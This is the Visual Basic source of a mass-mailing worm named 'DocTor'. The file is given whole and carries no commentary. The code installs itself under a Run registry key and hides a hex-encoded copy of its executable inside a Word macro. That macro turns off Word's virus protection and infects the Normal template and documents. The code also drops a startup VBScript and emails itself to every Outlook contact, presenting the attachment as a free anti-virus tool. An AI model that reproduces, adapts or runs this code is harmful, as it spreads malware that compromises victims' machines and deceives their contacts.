Attribute VB_Name = "Module1"
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
Private Declare Function GetCommandLine Lib "kernel32" Alias "GetCommandLineA" () As Long
Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef lpdwFlags As Long, ByVal dwReserved As Long) As Long
Private Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As Long) As Long
Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long
Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Const CSIDL_STARTUP = &H7
Private Type SHITEMID
    cb As Long
    abID As Byte
End Type
Private Type ITEMIDLIST
    mkid As SHITEMID
End Type
Public docv As String


Sub Main()
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")
org = App.Path & "\" & App.EXEName & ".exe"

If InStr(1, GetCommLine, "/newrun") = 0 Then

docv = "C:\"
Randomize (Timer)
For i = 1 To 8
docv = docv & Chr(Int(Rnd(1) * 26) + 97)
Next i
docv = docv & ".txt"

Call Install
Call DocVir
Call VbsDrop

Else
Sleep 20000
DeleteFile GetSpecialfolder(CSIDL_STARTUP) & "\doctor.vbs"

chkinet:
If InternetGetConnectedState(0&, 0&) = 0 Then GoTo chkinet

Set out = CreateObject("Outlook.Application")
Set map = out.GetNameSpace("MAPI")
If out = "Outlook" Then
map.Logon "profile", "password"
For y = 1 To map.AddressLists.Count
Set z = map.AddressLists(y)
x = 1
Set mel = out.CreateItem(0)
For oo = 1 To z.AddressEntries.Count
e = z.AddressEntries(x)
ml.Recipients.Add e
x = x + 1
If x < 500 Then oo = z.AddressEntries.Count
Next oo
mel.Subject = "NewTool for Word Macro Virus"
mel.Body = "This tool allows you to protect you against unknown macro virus." & vbCrLf & _
            "Click on the attached file to run this freeware." & vbCrLf & vbCrLf & _
            "Best Regards. Have a nice day"
mel.Attachments.Add orig, 1, 1, "DocTor.exe"
mel.Send
e = ""
Next y
map.Logoff
End If


End If

End Sub

Sub Install()
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")

org = App.Path & "\" & App.EXEName & ".exe"
cop = fso.GetSpecialfolder(0) & "\Doctor.exe"
copreg = fso.GetSpecialfolder(0) & "\Doctor.exe /newrun"

FileCopy org, cop
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DocTor", copreg


End Sub

Sub DocVir()
On Error Resume Next
Dim lngbufferlen
Dim bbyte As Byte
Dim pefile As String
orig = App.Path & "\" & App.EXEName & ".exe"

Open orig For Binary As #1
DoEvents
Do While Not EOF(1)
DoEvents
Get #1, , bbyte
e = Hex(bbyte)
If Len(e) = 1 Then e = "0" & Hex(bbyte)
pefile = pefile & e
Loop
Close #1

hexf = "pef = """
For i = 1 To Len(pefile) Step 110
hexf = hexf & Mid(pefile, i, 110) & """" & vbCrLf & "pef = pef & """
Next
hexf = hexf & """" & vbCrLf

inst = "read = dec(pef)" & vbCrLf & _
        "Set r = fso.CreateTextFile(fso.GetSpecialFolder(0) & ""\Doctor.exe"", 2)" & vbCrLf & _
        "r.Write read" & vbCrLf & _
        "r.Close" & vbCrLf & _
        "ws.RegWrite ""HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DocTor"", fso.GetSpecialFolder(0) & ""\Doctor.exe /newrun"""

conv = "Function dec(octe)" & vbCrLf & _
        "On Error Resume Next" & vbCrLf & _
        "For hexad = 1 To Len(octe) Step 2" & vbCrLf & _
        "dec = dec & Chr(""&h"" & Mid(octe, hexad, 2))" & vbCrLf & _
        "Next" & vbCrLf & _
        "End Function" & vbCrLf
        
infwrd = "Set doc = ActiveDocument.VBProject.VBComponents(1)" & vbCrLf & _
        "Set nor = NormalTemplate.VBProject.VBComponents(1)" & vbCrLf & _
        "With Options" & vbCrLf & _
        ".ConfirmConversions = False" & vbCrLf & _
        ".VirusProtection = False" & vbCrLf & _
        ".SaveNormalPrompt = False" & vbCrLf & _
        "End With" & vbCrLf & _
        "Select Case Application.Version" & vbCrLf & _
        "Case ""10.0""" & vbCrLf & _
        "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"", ""Level"") = 1&" & vbCrLf & _
        "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"", ""AccessVBOM"") = 1&" & vbCrLf & _
        "Case ""9.0""" & vbCrLf & _
        "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") = 1&" & vbCrLf & _
        "End Select" & vbCrLf & _
        "WordBasic.DisableAutoMacros 0" & vbCrLf & vbCrLf & _
        "If nor.Name <> ""DocTor"" Then"

infwrd2 = "install doc, nor" & vbCrLf & _
        "End If" & vbCrLf & _
        "If doc.Name <> ""DocTor"" Then" & vbCrLf & _
        "install nor, doc" & vbCrLf & _
        "Activedocument.Save" & vbCrLf & _
        "End If"
        
instal = "Private Sub install(src, dst)" & vbCrLf & _
        "Set odst = dst.CodeModule" & vbCrLf & _
        "Set osrc = src.CodeModule" & vbCrLf & _
        "odst.DeleteLines 1, odst.CountOfLines" & vbCrLf & _
        "odst.InsertLines 1, osrc.Lines(1, osrc.CountOfLines)" & vbCrLf & _
        "End Sub" & vbCrLf

Open docv For Output As #1
Print #1, "Private Sub Document_Open()"
Print #1, "On Error Resume Next"
Print #1, "Set fso=CreateObject(""Scripting.FileSystemObject"")"
Print #1, "Set ws=CreateObject(""WScript.Shell"")" & vbCrLf
Print #1, hexf
Print #1, infwrd
Print #1, inst
Print #1, infwrd2
Print #1, "End Sub" & vbCrLf
Print #1, instal
Print #1, conv
Close #1
End Sub

Sub VbsDrop()
On Error Resume Next
vbsdrp = GetSpecialfolder(CSIDL_STARTUP) & "\doctor.vbs"

vbs = "On Error Resume Next" & vbCrLf & _
        "set fso=createobject(""scripting.filesystemobject"")" & vbCrLf & _
        "set ws=createobject(""wscript.shell"")" & vbCrLf & _
        "Set wrd=createObject(""Word.Application"")" & vbCrLf & _
        "wrd.options.virusprotection=0" & vbCrLf & _
        "wrd.options.savenormalprompt=0" & vbCrLf & _
        "wrd.options.confirmconversions=0" & vbCrLf & _
        "ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level"",1,""REG_DWORD""" & vbCrLf & _
        "ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level"",1,""REG_DWORD""" & vbCrLf & _
        "ws.regwrite ""HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM"",1,""REG_DWORD""" & vbCrLf & _
        "If wrd.normaltemplate.vbproject.vbcomponents(1).name <> ""DocTor"" then" & vbCrLf & _
        "wrd.normaltemplate.vbproject.vbcomponents(1).codemodule.addfromfile(""" & docv & """)" & vbCrLf & _
        "wrd.normaltemplate.vbproject.vbcomponents(1).name=""DocTor""" & vbCrLf & _
        "End If" & vbCrLf & _
        "wscript.sleep 500" & vbCrLf & _
        "fso.deletefile """ & docv & """" & vbCrLf & _
        "wrd.application.quit"

Open vbsdrp For Output As #1
Print #1, vbs
Close #1
End Sub

Private Function GetCommLine() As String
    Dim RetStr As Long, SLen As Long
    Dim Buffer As String
    RetStr = GetCommandLine
    SLen = lstrlen(RetStr)
    If SLen > 0 Then
        GetCommLine = Space$(SLen)
        CopyMemory ByVal GetCommLine, ByVal RetStr, SLen
    End If
End Function

Private Function GetSpecialfolder(CSIDL As Long) As String
    Dim r As Long
    Dim IDL As ITEMIDLIST
    r = SHGetSpecialFolderLocation(100, CSIDL, IDL)
    If r = NOERROR Then
        Path$ = Space$(512)
        r = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal Path$)
        GetSpecialfolder = Left$(Path, InStr(Path, Chr$(0)) - 1)
        Exit Function
    End If
    GetSpecialfolder = ""
End Function
